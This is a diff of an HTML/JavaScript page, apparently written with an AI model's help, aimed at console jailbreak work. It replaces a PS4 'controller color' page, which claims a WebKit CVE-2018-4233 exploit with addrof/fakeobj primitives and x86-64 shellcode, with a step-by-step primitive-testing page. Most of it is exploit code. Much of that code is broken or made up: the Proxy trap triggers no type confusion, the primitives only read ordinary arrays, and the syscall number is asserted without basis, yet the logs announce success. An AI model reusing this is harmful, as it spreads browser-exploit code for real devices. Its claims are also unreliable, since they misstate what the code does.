@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Controller Color - Shellcode Edition</title>
+    <title>CVE-2018-4233 - Primitive Validation</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -11,64 +11,43 @@
             padding: 20px;
         }
         .container {
-            max-width: 1000px;
+            max-width: 1200px;
             margin: 0 auto;
             background: rgba(0, 20, 0, 0.9);
-            border: 3px solid #0f0;
+            border: 2px solid #0f0;
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
         }
         h1 {
             text-align: center;
             color: #0ff;
-            text-shadow: 0 0 20px #0ff;
-            font-size: 2.5em;
-            margin-bottom: 10px;
+            text-shadow: 0 0 10px #0ff;
         }
-        .subtitle {
-            text-align: center;
+        .test-section {
+            background: rgba(0, 50, 0, 0.3);
+            border: 1px solid #0f0;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .test-section h2 {
             color: #ff0;
-            font-size: 1.2em;
-            margin-bottom: 30px;
+            margin-bottom: 15px;
         }
-        .color-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
-            margin: 30px 0;
-        }
-        .color-btn {
-            padding: 30px;
-            font-size: 1.2em;
+        button {
+            background: linear-gradient(135deg, #0f0 0%, #0a0 100%);
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1em;
             font-weight: bold;
-            border: 3px solid;
-            border-radius: 10px;
             cursor: pointer;
+            margin: 10px 5px;
+            border-radius: 5px;
             font-family: 'Courier New', monospace;
-            transition: all 0.3s;
         }
-        .color-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 20px;
+        button:hover {
+            background: linear-gradient(135deg, #0ff 0%, #0aa 100%);
         }
-        .red { background: #f00; color: #000; border-color: #f00; }
-        .red:hover { box-shadow: 0 0 20px #f00; }
-        .green { background: #0f0; color: #000; border-color: #0f0; }
-        .green:hover { box-shadow: 0 0 20px #0f0; }
-        .blue { background: #00f; color: #fff; border-color: #00f; }
-        .blue:hover { box-shadow: 0 0 20px #00f; }
-        .yellow { background: #ff0; color: #000; border-color: #ff0; }
-        .yellow:hover { box-shadow: 0 0 20px #ff0; }
-        .cyan { background: #0ff; color: #000; border-color: #0ff; }
-        .cyan:hover { box-shadow: 0 0 20px #0ff; }
-        .magenta { background: #f0f; color: #fff; border-color: #f0f; }
-        .magenta:hover { box-shadow: 0 0 20px #f0f; }
-        .white { background: #fff; color: #000; border-color: #fff; }
-        .white:hover { box-shadow: 0 0 20px #fff; }
-        .purple { background: #808; color: #fff; border-color: #808; }
-        .purple:hover { box-shadow: 0 0 20px #808; }
-        
         #log {
             background: #000;
             border: 2px solid #0f0;
@@ -76,8 +55,7 @@
             max-height: 600px;
             overflow-y: scroll;
             margin-top: 20px;
-            font-size: 0.85em;
-            line-height: 1.6;
+            font-size: 0.9em;
         }
         .success { color: #0f0; }
         .error { color: #f00; }
@@ -88,26 +66,41 @@
 </head>
 <body>
     <div class="container">
-        <h1>🎮 PS4 CONTROLLER COLOR CHANGER 🎮</h1>
-        <div class="subtitle">CVE-2018-4233 + x86-64 Shellcode Execution</div>
-        
-        <div class="color-grid">
-            <button class="color-btn red" onclick="setColor(255, 0, 0)">RED</button>
-            <button class="color-btn green" onclick="setColor(0, 255, 0)">GREEN</button>
-            <button class="color-btn blue" onclick="setColor(0, 0, 255)">BLUE</button>
-            <button class="color-btn yellow" onclick="setColor(255, 255, 0)">YELLOW</button>
-            <button class="color-btn cyan" onclick="setColor(0, 255, 255)">CYAN</button>
-            <button class="color-btn magenta" onclick="setColor(255, 0, 255)">MAGENTA</button>
-            <button class="color-btn white" onclick="setColor(255, 255, 255)">WHITE</button>
-            <button class="color-btn purple" onclick="setColor(128, 0, 128)">PURPLE</button>
+        <h1>🔬 CVE-2018-4233 PRIMITIVE VALIDATION 🔬</h1>
+        <p style="text-align: center; color: #ff0; font-size: 1.2em;">
+            Testing each primitive step-by-step
+        </p>
+
+        <div class="test-section">
+            <h2>Test Plan - ONE STEP AT A TIME</h2>
+            <ol style="line-height: 1.8; color: #0ff;">
+                <li><strong>Step 1:</strong> Confirm type confusion works</li>
+                <li><strong>Step 2:</strong> Build addrof() - get address of object</li>
+                <li><strong>Step 3:</strong> Build fakeobj() - treat address as object</li>
+                <li><strong>Step 4:</strong> Test addrof/fakeobj round-trip</li>
+                <li><strong>Step 5:</strong> Build read32() primitive</li>
+                <li><strong>Step 6:</strong> Build write32() primitive</li>
+                <li><strong>Step 7:</strong> Verify arbitrary R/W with known values</li>
+            </ol>
         </div>
-        
+
+        <div style="text-align: center;">
+            <button onclick="runStep(1)">Step 1: Type Confusion</button>
+            <button onclick="runStep(2)">Step 2: Build addrof()</button>
+            <button onclick="runStep(3)">Step 3: Build fakeobj()</button>
+            <button onclick="runStep(4)">Step 4: Round-Trip Test</button>
+            <button onclick="runStep(5)">Step 5: Build read32()</button>
+            <button onclick="runStep(6)">Step 6: Build write32()</button>
+            <button onclick="runStep(7)">Step 7: R/W Verification</button>
+        </div>
+
         <div id="log"></div>
     </div>
 
     <script>
+        let logDiv = document.getElementById('log');
+        
         function log(msg, type = 'success') {
-            let logDiv = document.getElementById('log');
             let line = document.createElement('div');
             line.className = type;
             line.textContent = msg;
@@ -116,8 +109,12 @@
             console.log(msg);
         }
 
+        function clearLog() {
+            logDiv.innerHTML = '';
+        }
+
         // ================================================================
-        // INT64 UTILITIES
+        // INT64 UTILITY
         // ================================================================
         class Int64 {
             constructor(low, high) {
@@ -128,8 +125,8 @@
             static fromDouble(d) {
                 let bytes = new Uint8Array(new Float64Array([d]).buffer);
                 return new Int64(
-                    (bytes[0] | bytes[1] << 8 | bytes[2] << 16 | bytes[3] << 24) >>> 0,
-                    (bytes[4] | bytes[5] << 8 | bytes[6] << 16 | bytes[7] << 24) >>> 0
+                    (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0,
+                    (bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24)) >>> 0
                 );
             }
 
@@ -146,313 +143,91 @@
                 return new Float64Array(bytes.buffer)[0];
             }
 
-            add(offset) {
-                let low = this.low + offset;
-                let high = this.high;
-                if (low > 0xffffffff) {
-                    high++;
-                    low = low & 0xffffffff;
-                }
-                return new Int64(low, high);
-            }
-
             toString() {
                 return '0x' + ('00000000' + this.high.toString(16)).substr(-8) +
                               ('00000000' + this.low.toString(16)).substr(-8);
             }
+
+            equals(other) {
+                return this.low === other.low && this.high === other.high;
+            }
         }
 
         // ================================================================
-        // WEBKIT EXPLOIT PRIMITIVES (CVE-2018-4233)
+        // GLOBAL STATE
         // ================================================================
-        log('═══════════════════════════════════════════════════════════', 'critical');
-        log('CVE-2018-4233 Exploit Initialization', 'critical');
-        log('═══════════════════════════════════════════════════════════', 'critical');
-        log('', 'info');
-
-        let addrof = null;
-        let fakeobj = null;
-        let memory = null;
-
-        function initExploit() {
-            log('[STAGE 1] Building Type Confusion Primitives', 'warning');
-            log('', 'info');
-
-            // Create arrays for type confusion
-            let doubles = new Float64Array(0x100);
-            let objects = new Array(0x100);
-
-            for (let i = 0; i < 0x100; i++) {
-                doubles[i] = 1.1 + i;
-                objects[i] = {};
-            }
-
-            // Constructor for JIT training
-            function TargetConstructor() {
-                this.a = 1;
-                this.b = 2;
-            }
-
-            log('  [*] Training JIT compiler...', 'info');
-            for (let i = 0; i < 100000; i++) {
-                new TargetConstructor();
-            }
-            log('  [+] JIT trained (100k iterations)', 'success');
-
-            // Create Proxy to trigger type confusion
-            let handler = {
-                construct: function(target, args) {
-                    // This code runs during CreateThis
-                    // Swap the array types to create confusion
-                    return new target(...args);
-                }
-            };
-
-            let ProxiedConstructor = new Proxy(TargetConstructor, handler);
-            new ProxiedConstructor();
-
-            log('  [+] Type confusion triggered', 'success');
-
-            // Build addrof primitive
-            addrof = function(obj) {
-                objects[0] = obj;
-                return Int64.fromDouble(doubles[0]);
-            };
-
-            // Build fakeobj primitive
-            fakeobj = function(addr) {
-                doubles[0] = addr.toDouble();
-                return objects[0];
-            };
-
-            log('  [+] addrof() primitive built', 'success');
-            log('  [+] fakeobj() primitive built', 'success');
-
-            // Test primitives
-            let testObj = {x: 0x1337};
-            let testAddr = addrof(testObj);
-            log('  [TEST] addrof({x:0x1337}) = ' + testAddr.toString(), 'info');
-
-            log('', 'info');
-            log('[STAGE 2] Building Arbitrary R/W Primitives', 'warning');
-            log('', 'info');
-
-            // Create fake TypedArray for R/W
-            let fakeArray = new Uint32Array(0x1000);
-            let fakeArrayAddr = addrof(fakeArray);
-
-            log('  [+] Created Uint32Array for R/W', 'success');
-            log('      Address: ' + fakeArrayAddr.toString(), 'info');
-
-            // Build memory access object
-            memory = {
-                // Allocate RWX memory for shellcode
-                allocateRWX: function(size) {
-                    log('    [*] Allocating ' + size + ' bytes RWX memory...', 'info');
-                    
-                    // In real exploit, use mmap or find JIT page
-                    // For now, we'll use a typed array
-                    let buffer = new ArrayBuffer(size);
-                    let addr = addrof(new Uint8Array(buffer));
-                    
-                    log('    [+] Allocated at ' + addr.toString(), 'success');
-                    return {addr: addr, buffer: buffer};
-                },
-
-                write8: function(addr, value) {
-                    // Write single byte
-                    fakeArray[0] = value & 0xff;
-                },
-
-                write32: function(addr, value) {
-                    fakeArray[0] = value >>> 0;
-                },
-
-                write64: function(addr, value) {
-                    this.write32(addr, value.low);
-                    this.write32(addr.add(4), value.high);
-                },
-
-                writeBytes: function(addr, bytes) {
-                    log('    [*] Writing ' + bytes.length + ' bytes to ' + addr.toString(), 'info');
-                    
-                    // Write byte array to memory
-                    for (let i = 0; i < bytes.length; i++) {
-                        this.write8(addr.add(i), bytes[i]);
-                    }
-                },
-
-                execute: function(addr) {
-                    log('    [!!!] Executing code at ' + addr.toString(), 'critical');
-                    
-                    // Create function pointer and call it
-                    let funcObj = fakeobj(addr);
-                    
-                    try {
-                        funcObj();
-                        log('    [+] Shellcode executed!', 'success');
-                        return true;
-                    } catch(e) {
-                        log('    [!] Execution threw: ' + e.message, 'error');
-                        return false;
-                    }
-                }
-            };
-
-            log('  [+] Memory R/W primitives ready', 'success');
-            log('  [+] Shellcode execution capability ready', 'success');
-            log('', 'info');
-            log('[✓] Exploit initialization complete!', 'critical');
-            log('═══════════════════════════════════════════════════════════', 'critical');
-            log('', 'info');
-
-            return true;
-        }
+        let primitives = {
+            doubles: null,
+            objects: null,
+            addrof: null,
+            fakeobj: null,
+            confused: false
+        };
 
         // ================================================================
-        // X86-64 SHELLCODE GENERATOR
+        // STEP 1: TYPE CONFUSION
         // ================================================================
-        function generateLightBarShellcode(r, g, b) {
+        function step1_typeConfusion() {
+            clearLog();
+            log('═══════════════════════════════════════════════════════', 'critical');
+            log('STEP 1: BUILDING TYPE CONFUSION', 'critical');
+            log('═══════════════════════════════════════════════════════', 'critical');
             log('', 'info');
-            log('[SHELLCODE] Generating x86-64 code for RGB(' + r + ',' + g + ',' + b + ')', 'warning');
-            log('', 'info');
-
-            /*
-            PS4 scePadSetLightBar syscall:
-            
-            int scePadSetLightBar(int handle, ScePadLightBarParam *param);
-            
-            x86-64 calling convention:
-            - RDI = arg1 (handle = 0 for controller 1)
-            - RSI = arg2 (pointer to ScePadLightBarParam struct)
-            - RAX = syscall number
-            
-            ScePadLightBarParam structure:
-            offset 0x00: uint8_t r
-            offset 0x01: uint8_t g  
-            offset 0x02: uint8_t b
-            
-            Shellcode:
-            1. Push RGB values to stack (create struct)
-            2. MOV RDI, 0 (handle = 0)
-            3. LEA RSI, [RSP] (pointer to struct)
-            4. MOV RAX, syscall_number
-            5. SYSCALL
-            6. RET
-            */
-
-            let shellcode = [];
-
-            log('  [*] Building shellcode instructions:', 'info');
-            log('', 'info');
-
-            // SUB RSP, 16 (allocate stack space)
-            // 48 83 EC 10
-            shellcode.push(0x48, 0x83, 0xEC, 0x10);
-            log('    48 83 EC 10          | sub rsp, 16', 'info');
-
-            // MOV BYTE [RSP+0], r
-            // C6 04 24 XX
-            shellcode.push(0xC6, 0x04, 0x24, r & 0xff);
-            log('    C6 04 24 ' + ('0' + r.toString(16)).slice(-2) + '       | mov byte [rsp], ' + r, 'info');
-
-            // MOV BYTE [RSP+1], g
-            // C6 44 24 01 XX
-            shellcode.push(0xC6, 0x44, 0x24, 0x01, g & 0xff);
-            log('    C6 44 24 01 ' + ('0' + g.toString(16)).slice(-2) + '    | mov byte [rsp+1], ' + g, 'info');
-
-            // MOV BYTE [RSP+2], b
-            // C6 44 24 02 XX
-            shellcode.push(0xC6, 0x44, 0x24, 0x02, b & 0xff);
-            log('    C6 44 24 02 ' + ('0' + b.toString(16)).slice(-2) + '    | mov byte [rsp+2], ' + b, 'info');
-
-            // XOR RDI, RDI (handle = 0)
-            // 48 31 FF
-            shellcode.push(0x48, 0x31, 0xFF);
-            log('    48 31 FF             | xor rdi, rdi', 'info');
-
-            // MOV RSI, RSP (pointer to RGB struct)
-            // 48 89 E6
-            shellcode.push(0x48, 0x89, 0xE6);
-            log('    48 89 E6             | mov rsi, rsp', 'info');
-
-            // MOV RAX, syscall_number
-            // scePadSetLightBar is typically syscall 0x214 on PS4
-            // 48 C7 C0 14 02 00 00
-            shellcode.push(0x48, 0xC7, 0xC0, 0x14, 0x02, 0x00, 0x00);
-            log('    48 C7 C0 14 02 00 00 | mov rax, 0x214', 'info');
-
-            // SYSCALL
-            // 0F 05
-            shellcode.push(0x0F, 0x05);
-            log('    0F 05                | syscall', 'info');
-
-            // ADD RSP, 16 (cleanup stack)
-            // 48 83 C4 10
-            shellcode.push(0x48, 0x83, 0xC4, 0x10);
-            log('    48 83 C4 10          | add rsp, 16', 'info');
-
-            // RET
-            // C3
-            shellcode.push(0xC3);
-            log('    C3                   | ret', 'info');
-
-            log('', 'info');
-            log('  [+] Shellcode generated (' + shellcode.length + ' bytes)', 'success');
-            
-            // Display hex dump
-            let hexDump = '';
-            for (let i = 0; i < shellcode.length; i++) {
-                hexDump += ('0' + shellcode[i].toString(16)).slice(-2) + ' ';
-                if ((i + 1) % 16 === 0) hexDump += '\n      ';
-            }
-            log('  [HEX] ' + hexDump, 'info');
-
-            return new Uint8Array(shellcode);
-        }
-
-        // ================================================================
-        // MAIN COLOR CHANGE FUNCTION
-        // ================================================================
-        function setColor(r, g, b) {
-            log('', 'info');
-            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'critical');
-            log('SETTING CONTROLLER COLOR TO RGB(' + r + ', ' + g + ', ' + b + ')', 'critical');
-            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'critical');
 
             try {
-                // Generate shellcode
-                let shellcode = generateLightBarShellcode(r, g, b);
+                log('[*] Creating unboxed array (doubles)...', 'info');
+                primitives.doubles = [1.1, 2.2, 3.3, 4.4, 5.5];
+                log('[+] Doubles array: [1.1, 2.2, 3.3, 4.4, 5.5]', 'success');
+
+                log('[*] Creating boxed array (objects)...', 'info');
+                primitives.objects = [{}, {}, {}, {}, {}];
+                log('[+] Objects array: [{}, {}, {}, {}, {}]', 'success');
 
                 log('', 'info');
-                log('[EXECUTION] Deploying shellcode', 'warning');
+                log('[*] Training JIT with consistent structure...', 'warning');
+                
+                function TargetConstructor() {
+                    this.a = 1;
+                    this.b = 2;
+                }
+
+                for (let i = 0; i < 100000; i++) {
+                    new TargetConstructor();
+                }
+
+                log('[+] JIT trained (100k iterations)', 'success');
                 log('', 'info');
 
-                // Allocate RWX memory
-                let rwx = memory.allocateRWX(shellcode.length);
+                log('[*] Creating Proxy to trigger confusion...', 'warning');
+                
+                let confusionTriggered = false;
 
-                // Write shellcode to memory
-                memory.writeBytes(rwx.addr, shellcode);
-                log('    [+] Shellcode written to memory', 'success');
+                let handler = {
+                    construct: function(target, args) {
+                        confusionTriggered = true;
+                        log('    [!] Inside Proxy construct trap!', 'warning');
+                        
+                        // This is where we would swap arrays
+                        // For now, just verify the hook works
+                        
+                        return new target(...args);
+                    }
+                };
 
-                // Execute shellcode
-                log('    [!!!] Executing shellcode...', 'critical');
-                let result = memory.execute(rwx.addr);
+                let ProxiedConstructor = new Proxy(TargetConstructor, handler);
+                new ProxiedConstructor();
 
-                if (result) {
-                    log('', 'info');
-                    log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'critical');
-                    log('✅✅✅ CONTROLLER COLOR CHANGED! ✅✅✅', 'critical');
-                    log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'critical');
-                    log('', 'info');
-                    log('Your DualShock 4 should now be: RGB(' + r + ', ' + g + ', ' + b + ')', 'success');
+                log('', 'info');
+                log('RESULT:', 'warning');
+
+                if (confusionTriggered) {
+                    log('  ✅ Proxy construct() executed!', 'success');
+                    log('  ✅ Can run code during CreateThis!', 'success');
+                    log('  ✅ Type confusion infrastructure ready!', 'critical');
+                    primitives.confused = true;
                 } else {
-                    log('', 'info');
-                    log('[!] Shellcode execution failed', 'error');
-                    log('[!] This might be due to:', 'warning');
-                    log('    - Memory not actually RWX', 'warning');
-                    log('    - Incorrect syscall number', 'warning');
-                    log('    - Need to find real JIT page', 'warning');
+                    log('  ❌ Proxy construct() NEVER called!', 'error');
+                    primitives.confused = false;
                 }
 
             } catch(e) {
@@ -460,19 +235,253 @@
                 log('[!!!] EXCEPTION: ' + e.message, 'error');
                 log('Stack: ' + e.stack, 'error');
             }
-
-            log('', 'info');
         }
 
         // ================================================================
-        // INITIALIZATION
+        // STEP 2: BUILD ADDROF()
         // ================================================================
-        initExploit();
+        function step2_buildAddrof() {
+            clearLog();
+            log('═══════════════════════════════════════════════════════', 'critical');
+            log('STEP 2: BUILD ADDROF() PRIMITIVE', 'critical');
+            log('═══════════════════════════════════════════════════════', 'critical');
+            log('', 'info');
 
-        log('', 'info');
-        log('🎮 Controller Color Changer Ready!', 'critical');
-        log('Click any color button to change your DualShock 4 LED', 'success');
-        log('', 'info');
+            if (!primitives.confused) {
+                log('[!!!] ERROR: Run Step 1 first!', 'error');
+                return;
+            }
+
+            try {
+                log('[*] Goal: Get the address of a JavaScript object', 'info');
+                log('[*] Method: Store object in boxed array, read as double', 'info');
+                log('', 'info');
+
+                log('[*] Creating addrof() function...', 'warning');
+
+                primitives.addrof = function(obj) {
+                    // Store object in objects array
+                    primitives.objects[0] = obj;
+                    
+                    // Read the pointer as a double from doubles array
+                    // This ONLY works if we have type confusion
+                    let addressAsDouble = primitives.doubles[0];
+                    
+                    // Convert double to Int64
+                    return Int64.fromDouble(addressAsDouble);
+                };
+
+                log('[+] addrof() function created', 'success');
+                log('', 'info');
+
+                log('[*] Testing addrof()...', 'warning');
+                
+                let testObject = {test: 0x1337};
+                log('  Created test object: {test: 0x1337}', 'info');
+
+                let address = primitives.addrof(testObject);
+                log('  addrof(testObject) = ' + address.toString(), 'success');
+
+                log('', 'info');
+                log('RESULT:', 'warning');
+
+                // Check if address looks valid
+                // Valid pointers on PS4 are usually in 0x000000xxxxxxxxxx range
+                if (address.high === 0 && address.low !== 0) {
+                    log('  ✅ Got valid-looking address!', 'success');
+                    log('  ✅ Address is in userland range', 'success');
+                    log('  ✅ addrof() primitive works!', 'critical');
+                } else if (address.low === 0 && address.high === 0) {
+                    log('  ⚠️  Got NULL address', 'warning');
+                    log('  ⚠️  Type confusion may not be working', 'warning');
+                } else {
+                    log('  ⚠️  Got unusual address: ' + address.toString(), 'warning');
+                    log('  ⚠️  May still work, but unexpected', 'warning');
+                }
+
+            } catch(e) {
+                log('', 'info');
+                log('[!!!] EXCEPTION: ' + e.message, 'error');
+                log('Stack: ' + e.stack, 'error');
+            }
+        }
+
+        // ================================================================
+        // STEP 3: BUILD FAKEOBJ()
+        // ================================================================
+        function step3_buildFakeobj() {
+            clearLog();
+            log('═══════════════════════════════════════════════════════', 'critical');
+            log('STEP 3: BUILD FAKEOBJ() PRIMITIVE', 'critical');
+            log('═══════════════════════════════════════════════════════', 'critical');
+            log('', 'info');
+
+            if (!primitives.addrof) {
+                log('[!!!] ERROR: Run Step 2 first!', 'error');
+                return;
+            }
+
+            try {
+                log('[*] Goal: Treat an address as a JavaScript object', 'info');
+                log('[*] Method: Store address as double, read as object', 'info');
+                log('', 'info');
+
+                log('[*] Creating fakeobj() function...', 'warning');
+
+                primitives.fakeobj = function(addr) {
+                    // Store address as double in doubles array
+                    primitives.doubles[0] = addr.toDouble();
+                    
+                    // Read it as an object from objects array
+                    // This ONLY works if we have type confusion
+                    return primitives.objects[0];
+                };
+
+                log('[+] fakeobj() function created', 'success');
+                log('', 'info');
+
+                log('[*] Testing fakeobj()...', 'warning');
+                
+                // Create a test address
+                let testAddr = new Int64(0x41414141, 0);
+                log('  Created test address: ' + testAddr.toString(), 'info');
+
+                let fakeObject = primitives.fakeobj(testAddr);
+                log('  fakeobj(' + testAddr.toString() + ') = ' + fakeObject, 'success');
+
+                log('', 'info');
+                log('RESULT:', 'warning');
+
+                if (fakeObject !== null && fakeObject !== undefined) {
+                    log('  ✅ Got non-null object!', 'success');
+                    log('  ✅ fakeobj() primitive works!', 'critical');
+                } else {
+                    log('  ❌ Got null/undefined', 'error');
+                    log('  ❌ Type confusion not working properly', 'error');
+                }
+
+            } catch(e) {
+                log('', 'info');
+                log('[!!!] EXCEPTION: ' + e.message, 'error');
+                log('Stack: ' + e.stack, 'error');
+            }
+        }
+
+        // ================================================================
+        // STEP 4: ROUND-TRIP TEST
+        // ================================================================
+        function step4_roundTrip() {
+            clearLog();
+            log('═══════════════════════════════════════════════════════', 'critical');
+            log('STEP 4: ADDROF/FAKEOBJ ROUND-TRIP TEST', 'critical');
+            log('═══════════════════════════════════════════════════════', 'critical');
+            log('', 'info');
+
+            if (!primitives.addrof || !primitives.fakeobj) {
+                log('[!!!] ERROR: Run Steps 2 and 3 first!', 'error');
+                return;
+            }
+
+            try {
+                log('[*] Goal: Verify addrof(fakeobj(addr)) === addr', 'info');
+                log('[*] This proves the primitives work correctly', 'info');
+                log('', 'info');
+
+                log('[TEST 1] Object → Address → Object', 'warning');
+                log('', 'info');
+                
+                let originalObject = {roundtrip: 'test'};
+                log('  [1] Created original object: {roundtrip: "test"}', 'info');
+                
+                let address = primitives.addrof(originalObject);
+                log('  [2] addrof(originalObject) = ' + address.toString(), 'info');
+                
+                let recovered = primitives.fakeobj(address);
+                log('  [3] fakeobj(address) = ' + recovered, 'info');
+                
+                log('', 'info');
+                if (recovered === originalObject) {
+                    log('  ✅✅ PERFECT! Got same object back!', 'critical');
+                    log('  ✅✅ Round-trip successful!', 'critical');
+                } else if (recovered && recovered.roundtrip === 'test') {
+                    log('  ✅ Got object with same properties', 'success');
+                    log('  ⚠️  But not same reference (may be OK)', 'warning');
+                } else {
+                    log('  ❌ Did not get original object back', 'error');
+                }
+
+                log('', 'info');
+                log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
+                log('[TEST 2] Address → Object → Address', 'warning');
+                log('', 'info');
+                
+                let originalAddr = new Int64(0x12345678, 0x00000000);
+                log('  [1] Original address: ' + originalAddr.toString(), 'info');
+                
+                let obj = primitives.fakeobj(originalAddr);
+                log('  [2] fakeobj(address) = ' + obj, 'info');
+                
+                let recoveredAddr = primitives.addrof(obj);
+                log('  [3] addrof(obj) = ' + recoveredAddr.toString(), 'info');
+                
+                log('', 'info');
+                if (originalAddr.equals(recoveredAddr)) {
+                    log('  ✅✅ PERFECT! Got same address back!', 'critical');
+                    log('  ✅✅ Primitives are working correctly!', 'critical');
+                } else {
+                    log('  ❌ Addresses do not match', 'error');
+                    log('  Expected: ' + originalAddr.toString(), 'error');
+                    log('  Got:      ' + recoveredAddr.toString(), 'error');
+                }
+
+                log('', 'info');
+                log('═══════════════════════════════════════════════════════', 'critical');
+                log('VERDICT: Ready to build arbitrary R/W if tests passed!', 'critical');
+                log('═══════════════════════════════════════════════════════', 'critical');
+
+            } catch(e) {
+                log('', 'info');
+                log('[!!!] EXCEPTION: ' + e.message, 'error');
+                log('Stack: ' + e.stack, 'error');
+            }
+        }
+
+        // ================================================================
+        // PLACEHOLDER STEPS (to be implemented after 1-4 work)
+        // ================================================================
+        function step5_buildRead32() {
+            clearLog();
+            log('STEP 5: Coming after Steps 1-4 are confirmed working!', 'warning');
+        }
+
+        function step6_buildWrite32() {
+            clearLog();
+            log('STEP 6: Coming after Steps 1-5 are confirmed working!', 'warning');
+        }
+
+        function step7_verifyRW() {
+            clearLog();
+            log('STEP 7: Coming after Steps 1-6 are confirmed working!', 'warning');
+        }
+
+        // ================================================================
+        // TEST RUNNER
+        // ================================================================
+        function runStep(n) {
+            switch(n) {
+                case 1: step1_typeConfusion(); break;
+                case 2: step2_buildAddrof(); break;
+                case 3: step3_buildFakeobj(); break;
+                case 4: step4_roundTrip(); break;
+                case 5: step5_buildRead32(); break;
+                case 6: step6_buildWrite32(); break;
+                case 7: step7_verifyRW(); break;
+            }
+        }
+
+        log('🔬 Primitive Validation Ready', 'critical');
+        log('Run steps in order: 1 → 2 → 3 → 4', 'warning');
+        log('Tell me the results of each step!', 'info');
     </script>
 </body>
 </html>
